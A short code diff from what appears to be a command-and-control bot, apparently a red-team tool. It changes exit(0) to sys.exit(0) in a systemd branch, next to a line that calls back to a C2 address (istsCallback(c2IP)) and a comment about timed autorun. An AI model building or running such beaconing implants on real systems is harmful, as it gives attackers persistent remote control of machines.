@@ -697,7 +697,7 @@ def main():
             istsbot.istsCallback(c2IP)
         if args.systemd:
             # running from systemd, don't enable timed autorun
-            exit(0)
+            sys.exit(0)
         time.sleep(30)
 
 if __name__ == "__main__":
